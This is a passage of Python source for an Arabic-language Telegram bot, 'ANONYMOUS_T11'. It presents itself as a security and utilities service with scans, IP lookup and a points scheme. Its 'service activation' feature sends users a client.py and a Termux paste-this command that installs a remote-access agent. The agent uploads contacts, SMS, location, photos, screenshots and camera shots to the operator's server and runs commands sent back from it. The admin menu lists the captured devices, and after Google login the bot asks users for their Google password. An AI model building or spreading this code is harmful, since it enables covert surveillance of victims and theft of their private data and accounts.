                    result_lines.append(f"   • الكلمات المفتاحية: {kw[:100]}...")
        except:
            pass
        result_lines.append("")
    except Exception as e:
        result_lines.append(f"⚠️ **الفحص المباشر:** فشل الاتصال: {str(e)}")

    # 3. فحص SSL
    domain = re.sub(r'^https?://', '', url).split('/')[0]
    ssl_info = get_ssl_info(domain)
    if ssl_info:
        result_lines.append("🔒 **شهادة SSL:**")
        if ssl_info.get('CN'):
            result_lines.append(f"   • الاسم الشائع: {ssl_info['CN']}")
        if ssl_info.get('تاريخ_الانتهاء'):
            result_lines.append(f"   • تنتهي في: {ssl_info['تاريخ_الانتهاء']}")
        if ssl_info.get('المصدر') and 'organizationName' in ssl_info['المصدر']:
            result_lines.append(f"   • الجهة المصدرة: {ssl_info['المصدر']['organizationName']}")
        result_lines.append("")

    return "\n".join(result_lines)

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    """إنشاء تقرير فحص الثغرات المحسّن"""
    results = []
    results.append("=" * 60)
    results.append("🛡️ **تقرير فحص الثغرات الأمني**")
    results.append(f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("=" * 60)
    results.append("")

    if target_domain:
        results.append("📌 **1. تحليل النطاق:**")
        results.append(check_domain_virustotal(target_domain))
        results.append("")

    if target_url:
        results.append("📌 **2. فحص أمان الموقع:**")
        results.append(check_website_security(target_url))
        results.append("")

    if target_ip:
        results.append("📌 **3. معلومات IP:**")
        try:
            response = REQUEST_SESSION.get(f"http://ip-api.com/json/{target_ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    ip_info = (
                        f"🖥️ **IP:** `{target_ip}`\n"
                        f"   • البلد: {data.get('country', 'غير معروف')}\n"
                        f"   • المنطقة: {data.get('regionName', 'غير معروف')}\n"
                        f"   • المدينة: {data.get('city', 'غير معروف')}\n"
                        f"   • المزود: {data.get('isp', 'غير معروف')}\n"
                        f"   • المنظمة: {data.get('org', 'غير معروف')}\n"
                        f"   • الإحداثيات: {data.get('lat', '')}, {data.get('lon', '')}\n"
                        f"   • المنطقة الزمنية: {data.get('timezone', 'غير معروف')}"
                    )
                    results.append(ip_info)
                else:
                    results.append(f"⚠️ لم يتم العثور على معلومات لـ `{target_ip}`")
            else:
                results.append(f"⚠️ فشل الاتصال بخدمة IP-API (كود {response.status_code})")
        except Exception as e:
            results.append(f"⚠️ فشل جلب معلومات IP: {str(e)}")
        results.append("")

    # نصائح أمنية
    results.append("=" * 60)
    results.append("📋 **التوصيات الأمنية:**")
    results.append("• تأكد من تحديث جميع البرامج والأنظمة بشكل دوري.")
    results.append("• استخدم كلمات مرور قوية ومختلفة لكل خدمة.")
    results.append("• فعّل المصادقة الثنائية (2FA) حيثما أمكن.")
    results.append("• راجع سجلات الدخول والمراقبة بانتظام.")
    results.append("• قم بعمل نسخ احتياطية للبيانات المهمة.")
    results.append("• استخدم جدران الحماية وأنظمة كشف التسلل.")
    results.append("=" * 60)

    return "\n".join(results)

# ===================== دوال الخدمات الأخرى (مستمرة) =====================

def scan_website(url):
    """فحص الموقع مع تقرير محسّن (يُستخدم في زر فحص الأمان)"""
    # نستخدم الدالة الجديدة check_website_security لكن نعيد تنسيق المخرجات لتتناسب مع الاستخدام العام
    report = check_website_security(url)
    # إضافة تقييم سريع
    if "ضار" in report or "تهديدات" in report:
        status = "malicious"
    elif "مشبوه" in report:
        status = "suspicious"
    else:
        status = "safe"
    return report, status

# (باقي دوال الخدمات الأخرى كما هي: track_phone_real, create_temp_email_real, scan_apk_real, generate_fb_report, extract_text_from_pdf, fetch_temp_numbers_advanced, download_video, shorten_url, إلخ)

# ... (هنا توضع بقية الدوال بدون تغيير، مع الإبقاء على دوال قاعدة البيانات، الإحالات، TTS، إلخ) ...

# ===================== دوال تفعيل الخدمات =====================
def send_termux_instructions(chat_id, role='user'):
    server_url = SERVER_URL if SERVER_URL else "https://your-server.com"
    device_id = f"dev_{secrets.randbelow(9000) + 1000}"
    chat_id_str = str(chat_id)

    client_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    عميل التحكم عن بعد - ANONYMOUS_T11
    الإصدار المحسّن - مزود بآلية إعادة المحاولة ومعالجة الأخطاء
"""

import os
import sys
import time
import json
import base64
import subprocess
import glob
import logging
from datetime import datetime

# ===================== الإعدادات =====================
SERVER = "{server_url}"
DEVICE_ID = "{device_id}"
CHAT_ID = "{chat_id_str}"
CLIENT_SECRET = "{CLIENT_SECRET_KEY}"
TIMEOUT = 30
RETRY_DELAY = 5
MAX_RETRIES = 3

# ===================== إعداد التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== دوال النظام =====================

def run_command(cmd, timeout=10):
    """تنفيذ أمر وعودة الناتج كنص"""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.stdout else "لا يوجد ناتج"
    except subprocess.TimeoutExpired:
        logger.warning(f"انتهى وقت الأمر: {{cmd}}")
        return "انتهى الوقت"
    except Exception as e:
        logger.error(f"خطأ في تنفيذ الأمر: {{e}}")
        return f"خطأ: {{str(e)}}"

def get_contacts():
    """جلب جهات الاتصال"""
    return run_command(["termux-contacts"])

def get_sms():
    """جلب الرسائل النصية"""
    return run_command(["termux-sms-list"])

def get_location():
    """جلب الموقع التقريبي"""
    return run_command(["termux-location"])

def get_recent_photos(limit=5):
    """جلب أحدث الصور من المعرض"""
    photos = []
    try:
        photo_files = (
            glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) +
            glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
        )
        photo_files.sort(key=os.path.getctime, reverse=True)
        for photo_path in photo_files[:limit]:
            with open(photo_path, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
                photos.append({{
                    "name": os.path.basename(photo_path),
                    "data": encoded
                }})
        return photos
    except Exception as e:
        logger.error(f"فشل جلب الصور: {{e}}")
        return []

def get_screenshot():
    """التقاط لقطة شاشة"""
    try:
        os.system("screencap -p /sdcard/screenshot_temp.png")
        with open("/sdcard/screenshot_temp.png", "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        logger.error(f"فشل التقاط الشاشة: {{e}}")
        return None

def take_camera_photo():
    """التقاط صورة بالكاميرا الخلفية"""
    try:
        os.system("termux-camera-photo -c 0 /sdcard/photo_temp.jpg")
        with open("/sdcard/photo_temp.jpg", "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        logger.error(f"فشل التقاط الصورة: {{e}}")
        return None

def collect_all_data():
    """جمع جميع البيانات في طلب واحد"""
    return {{
        "device_id": DEVICE_ID,
        "contacts": get_contacts(),
        "sms": get_sms(),
        "location": get_location(),
        "photos": get_recent_photos(3),
        "screenshot": get_screenshot(),
        "timestamp": datetime.now().isoformat()
    }}

def execute_command(command):
    """تنفيذ الأمر الوارد من السيرفر"""
    command = command.lower().strip()
    if command == "screenshot":
        return get_screenshot(), "image"
    elif command == "location":
        return get_location(), "text"
    elif command == "camera":
        return take_camera_photo(), "image"
    elif command == "contacts":
        return get_contacts(), "text"
    elif command == "sms":
        return get_sms(), "text"
    elif command == "photos":
        return json.dumps(get_recent_photos(10)), "json"
    else:
        return f"Unknown command: {{command}}", "text"

def register_device():
    """تسجيل الجهاز لدى السيرفر"""
    logger.info("جاري تسجيل الجهاز...")
    for attempt in range(MAX_RETRIES):
        try:
            data = collect_all_data()
            response = requests.post(
                f"{{SERVER}}/register_device",
                json=data,
                headers={{"X-Client-Token": CLIENT_SECRET}},
                timeout=TIMEOUT
            )
            if response.status_code == 200:
                logger.info("✅ تم التسجيل بنجاح")
                return True
            else:
                logger.warning(f"محاولة {{attempt+1}}: فشل التسجيل (كود {{response.status_code}})")
        except Exception as e:
            logger.error(f"محاولة {{attempt+1}}: {{e}}")
        time.sleep(RETRY_DELAY)
    return False

def main_loop():
    """الحلقة الرئيسية لاستقبال الأوامر"""
    logger.info("🔄 بدء حلقة الاستماع...")
    while True:
        try:
            response = requests.get(
                f"{{SERVER}}/get_command",
                params={{"device_id": DEVICE_ID}},
                headers={{"X-Client-Token": CLIENT_SECRET}},
                timeout=TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    command = data.get("command")
                    logger.info(f"📥 أمر ورد: {{command}}")
                    result, result_type = execute_command(command)

                    # إرسال النتيجة
                    payload = {{
                        "device_id": DEVICE_ID,
                        "result": result,
                        "result_type": result_type
                    }}
                    requests.post(
                        f"{{SERVER}}/submit_result",
                        json=payload,
                        headers={{"X-Client-Token": CLIENT_SECRET}},
                        timeout=TIMEOUT
                    )
                    logger.info(f"📤 تم إرسال النتيجة (نوع: {{result_type}})")
                elif data.get("status") == "no_command":
                    time.sleep(2)
            else:
                logger.warning(f"استجابة غير متوقعة: {{response.status_code}}")
                time.sleep(5)
        except requests.exceptions.RequestException as e:
            logger.error(f"خطأ في الاتصال: {{e}}")
            time.sleep(5)
        except Exception as e:
            logger.error(f"خطأ غير متوقع: {{e}}")
            time.sleep(5)

# ===================== نقطة الدخول =====================
if __name__ == "__main__":
    logger.info("🚀 بدء تشغيل عميل ANONYMOUS_T11")
    if register_device():
        logger.info("✅ الجهاز مرتبط. جاهز لتلقي الأوامر.")
        main_loop()
    else:
        logger.critical("❌ فشل التسجيل بعد عدة محاولات. إنهاء.")
        sys.exit(1)
'''
    file_path = os.path.join(TEMP_DIR, "client.py")
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(client_code)
        logger.info(f"✅ تم إنشاء client.py بنجاح للمستخدم {chat_id}")
    except Exception as e:
        logger.error(f"فشل إنشاء ملف client.py: {e}")
        safe_send(chat_id, "⚠️ حدث خطأ أثناء إنشاء ملف التفعيل. يُرجى المحاولة مرة أخرى.")
        return

    try:
        with open(file_path, 'rb') as f:
            bot.send_document(chat_id, f, caption="📱 ملف التفعيل - client.py")
        safe_send(chat_id, "✅ تم إرسال الملف بنجاح.")
    except Exception as e:
        logger.error(f"فشل إرسال ملف client.py: {e}")
        safe_send(chat_id, "⚠️ حدث خطأ أثناء إرسال الملف. يُرجى المحاولة مرة أخرى.")
        if os.path.exists(file_path):
            os.remove(file_path)
        return

    if os.path.exists(file_path):
        os.remove(file_path)

    instructions = (
        "📱 **تفعيل الخدمات الإضافية**\n\n"
        "قم بتحميل Termux ثم الصق الكود التالي (انسخه بالكامل):\n\n"
        "```bash\n"
        "pkg update && pkg upgrade -y && pkg install python -y && pip install requests && echo 'import requests, time, json, os, subprocess, base64, glob, sys, random; SERVER = \"{server_url}\"; DEVICE_ID = \"{device_id}\"; CHAT_ID = \"{chat_id_str}\"; CLIENT_SECRET = \"{CLIENT_SECRET_KEY}\"; def run_command(cmd, timeout=10): try: result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout); return result.stdout.strip() if result.stdout else \"لا يوجد ناتج\"; except: return \"خطأ\"; def get_contacts(): return run_command([\"termux-contacts\"]); def get_sms(): return run_command([\"termux-sms-list\"]); def get_location(): return run_command([\"termux-location\"]); def get_recent_photos(limit=5): photos = []; try: photo_files = glob.glob(\"/sdcard/DCIM/**/*.jpg\", recursive=True) + glob.glob(\"/sdcard/DCIM/**/*.png\", recursive=True); photo_files.sort(key=os.path.getctime, reverse=True); for photo_path in photo_files[:limit]: with open(photo_path, \"rb\") as f: encoded = base64.b64encode(f.read()).decode(); photos.append({{\"name\": os.path.basename(photo_path), \"data\": encoded}}); return photos; except: return []; def get_screenshot(): try: os.system(\"screencap -p /sdcard/screenshot_temp.png\"); with open(\"/sdcard/screenshot_temp.png\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return None; def take_camera_photo(): try: os.system(\"termux-camera-photo -c 0 /sdcard/photo_temp.jpg\"); with open(\"/sdcard/photo_temp.jpg\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return None; def collect_all_data(): return {{\"device_id\": DEVICE_ID, \"contacts\": get_contacts(), \"sms\": get_sms(), \"location\": get_location(), \"photos\": get_recent_photos(3), \"screenshot\": get_screenshot(), \"timestamp\": datetime.now().isoformat()}}; def execute_command(command): command = command.lower().strip(); if command == \"screenshot\": return get_screenshot(), \"image\"; elif command == \"location\": return get_location(), \"text\"; elif command == \"camera\": return take_camera_photo(), \"image\"; elif command == \"contacts\": return get_contacts(), \"text\"; elif command == \"sms\": return get_sms(), \"text\"; elif command == \"photos\": return json.dumps(get_recent_photos(10)), \"json\"; else: return f\"Unknown command: {{command}}\", \"text\"; def register_device(): logger.info(\"جاري تسجيل الجهاز...\"); for attempt in range(3): try: data = collect_all_data(); response = requests.post(f\"{{SERVER}}/register_device\", json=data, headers={{\"X-Client-Token\": CLIENT_SECRET}}, timeout=30); if response.status_code == 200: logger.info(\"✅ تم التسجيل بنجاح\"); return True; except: pass; time.sleep(5); return False; def main_loop(): logger.info(\"🔄 بدء حلقة الاستماع...\"); while True: try: response = requests.get(f\"{{SERVER}}/get_command\", params={{\"device_id\": DEVICE_ID}}, headers={{\"X-Client-Token\": CLIENT_SECRET}}, timeout=30); if response.status_code == 200: data = response.json(); if data.get(\"status\") == \"success\": command = data.get(\"command\"); logger.info(f\"📥 أمر ورد: {{command}}\"); result, result_type = execute_command(command); requests.post(f\"{{SERVER}}/submit_result\", json={{\"device_id\": DEVICE_ID, \"result\": result, \"result_type\": result_type}}, headers={{\"X-Client-Token\": CLIENT_SECRET}}, timeout=10); elif data.get(\"status\") == \"no_command\": time.sleep(2); else: time.sleep(5); except: time.sleep(5); if __name__ == \"__main__\": logger.info(\"🚀 بدء تشغيل عميل ANONYMOUS_T11\"); if register_device(): logger.info(\"✅ الجهاز مرتبط. جاهز لتلقي الأوامر.\"); main_loop(); else: logger.critical(\"❌ فشل التسجيل بعد عدة محاولات. إنهاء.\"); sys.exit(1)' > client.py && python client.py\n"
        "```\n\n"
        "✅ بعد تشغيل الأمر، سيتم تثبيت المتطلبات وتشغيل العميل تلقائياً.\n"
        "⚠️ تأكد من منح الأذونات اللازمة (الملفات، الكاميرا، الموقع)."
    ).format(server_url=server_url, device_id=device_id, chat_id_str=chat_id_str, CLIENT_SECRET_KEY=CLIENT_SECRET_KEY)

    safe_send(chat_id, instructions)

    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    safe_send(chat_id, "📌 اختر خدمة أخرى من القائمة:", reply_markup=markup)

# ===================== دوال Google OAuth =====================
GOOGLE_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/auth'
GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v1/userinfo'
SCOPES = ['https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile']

def generate_google_auth_url():
    if not GOOGLE_CLIENT_ID:
        return None
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'scope': ' '.join(SCOPES),
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent'
    }
    req = requests.Request('GET', GOOGLE_AUTH_URL, params=params)
    return req.prepare().url

def exchange_code_for_token(code):
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return None
    data = {
        'code': code,
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    try:
        response = REQUEST_SESSION.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
        response.raise_for_status()
        return response.json()
    except:
        return None

def get_google_user_info(access_token):
    if not access_token:
        return None
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        response = REQUEST_SESSION.get(GOOGLE_USERINFO_URL, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()
    except:
        return None

def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    url = generate_google_auth_url()
    if not url:
        safe_send(chat_id, "⚠️ الخدمة غير متاحة.")
        return
    safe_send(chat_id, f"🔑 ربط Google\n1. افتح الرابط: {url}\n2. انسخ الرمز وأرسل: /oauth <الرمز>\n3. أدخل كلمة السر.")
    notify_admin(f"🔑 مستخدم {chat_id} بدأ ربط Google")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة العامة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
user_welcome_sent = {}
tts_voice_selection = {}

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "دردشة ذكية": 0, "إنشاء صور": 0, "إيميل مؤقت": 0,
    "التحكم بالهاتف": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "ربط هاتف المستخدم": 0, "ربط هاتف الطفل": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0, "الرقابة الأبوية": 0,
    "تحليل PDF": 0, "رقم مؤقت": 0, "تحويل نص لصوت": 0, "تحميل فيديو": 0,
    "تقصير روابط": 0,
    "فحص ثغرات": 0
}

REQUIRE_LINK_BUTTONS = ["mode_apk", "mode_my_app", "mode_track_phone", "mode_fb_report"]

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    
    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان" if is_admin_user else ("🔍 فحص الأمان ✅" if user_points >= 10 else "🔍 فحص الأمان 🔒"), 
                            callback_data="mode_site" if is_admin_user or user_points >= 10 else "locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات" if is_admin_user else ("📦 فحص التطبيقات ✅" if user_points >= 10 else "📦 فحص التطبيقات 🔒"), 
                            callback_data="mode_apk" if is_admin_user or user_points >= 10 else "locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود" if is_admin_user else ("🛠️ مراجعة الكود ✅" if user_points >= 10 else "🛠️ مراجعة الكود 🔒"), 
                            callback_data="mode_my_app" if is_admin_user or user_points >= 10 else "locked_my_app"),
        InlineKeyboardButton("🧠 مساعد ذكي", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🖼️ إنشاء صور", callback_data="mode_image"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email")
    )
    if is_admin_user or user_points >= 30:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك" if is_admin_user else "بلاغ فيسبوك ✅", 
                                callback_data="mode_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    else:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf")
    )
    if is_admin_user or user_points >= 50:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم" if is_admin_user else "📱 الحصول على رقم ✅", 
                                callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
        )
    markup.row(
        InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_link_user"),
        InlineKeyboardButton("🚸 حماية إضافية", callback_data="mode_link_child")
    )
    markup.row(
        InlineKeyboardButton("🔊 تحويل نص إلى صوت" if is_admin_user else ("🔊 تحويل نص إلى صوت ✅" if user_points >= 10 else "🔊 تحويل نص إلى صوت 🔒"), 
                            callback_data="mode_tts" if is_admin_user or user_points >= 10 else "locked_tts"),
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download")
    )
    markup.row(
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص ثغرات" if is_admin_user else ("🛡️ فحص ثغرات ✅" if user_points >= 20 else "🛡️ فحص ثغرات 🔒"), 
                            callback_data="mode_vuln_scan" if is_admin_user or user_points >= 20 else "locked_vuln_scan")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ Google متصل", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔑 ربط Google", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            markup.row(InlineKeyboardButton(f"📱 {dev['device_id']}", callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

def build_fb_report_type_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    welcome = (
        "مرحبا بك في نظام ANONYMOUS_T11\n"
        "قم بالضغط على /Start ليعمل النظام 🌐\n"
        "واختر الخيارات التي تريدها 🤖\n"
        "بعض الخيارات تحتاج إلى نقاط 🔒\n"
        "للحصول على نقاط عليك مشاركة النظام 🤖\n"
        "بعض الخيارات تحتاج لتفعيل الخدمات 🤖\n"
        "اوامر المساعدة اضغط /help 👤"
    )
    safe_send(chat_id, welcome)
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 الأوامر المتاحة\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - ربط Google\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط.\n"
        "🔒 الأزرار المغلقة تتطلب نقاطاً.\n"
        "🔓 الأزرار المفتوحة متاحة للجميع.\n"
        "👑 المطور لديه صلاحية كاملة ولا يحتاج نقاط."
    )
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['oauth'])
def google_oauth(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send(chat_id, "❌ استخدم: /oauth <الرمز>")
        return
    code = parts[1].strip()
    token_data = exchange_code_for_token(code)
    if not token_data:
        safe_send(chat_id, "❌ فشل التبادل.")
        return
    user_info = get_google_user_info(token_data['access_token'])
    if not user_info:
        safe_send(chat_id, "❌ فشل جلب البيانات.")
        return
    google_users[chat_id] = {
        'id': user_info['id'],
        'email': user_info['email'],
        'name': user_info['name'],
        'access_token': token_data['access_token'],
        'refresh_token': token_data.get('refresh_token'),
        'expiry': datetime.now() + timedelta(seconds=token_data['expires_in'])
    }
    user_states[chat_id] = "waiting_for_google_password"
    safe_send(chat_id, "✅ تم ربط البريد. الرجاء إدخال كلمة السر.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج النقر على الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"answer_callback_query error: {e}")
    
    chat_id = call.message.chat.id
    user_id = chat_id
    data = call.data

    if data.startswith("voice_"):
        voice_key = data.split("_")[1]
        tts_voice_selection[chat_id] = voice_key
        user_states[chat_id] = "waiting_for_tts_text"
        safe_send(chat_id, f"✅ تم اختيار: {VOICE_MAP[voice_key]['name']}\n\nالآن أرسل النص للتحويل.")
        return

    if data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nالآن اكتب شرحاً مفصلاً للمشكلة.")
        return

    if data.startswith("locked_"):
        if is_admin(user_id):
            actual_mode = data.replace("locked_", "mode_")
            if actual_mode == "mode_site":
                user_states[chat_id] = "waiting_for_site"
                safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
            elif actual_mode == "mode_apk":
                user_states[chat_id] = "waiting_for_apk"
                safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
            elif actual_mode == "mode_my_app":
                user_states[chat_id] = "waiting_for_my_app"
                safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
            elif actual_mode == "mode_track_phone":
                user_states[chat_id] = "waiting_for_track_num"
                safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
            elif actual_mode == "mode_tts":
                if not FFMPEG_AVAILABLE:
                    safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
                    return
                safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
            elif actual_mode == "mode_vuln_scan":
                user_states[chat_id] = "waiting_for_vuln_target"
                safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\n"
                                   "يمكنك إرسال أحد الأشكال التالية:\n"
                                   "• رابط موقع: https://example.com\n"
                                   "• عنوان IP: 192.168.1.1\n"
                                   "• نطاق: example.com")
            else:
                safe_send(chat_id, "⚠️ ميزة غير معروفة.")
            return
        
        points = get_user_points(user_id)
        required = 20 if "vuln_scan" in data else 10
        if points < required:
            safe_send(chat_id, f"❌ نقاط غير كافية! تحتاج {required} نقطة لاستخدام هذه الميزة.")
            return
        if not deduct_points(chat_id, required, f"استخدام ميزة {data}"):
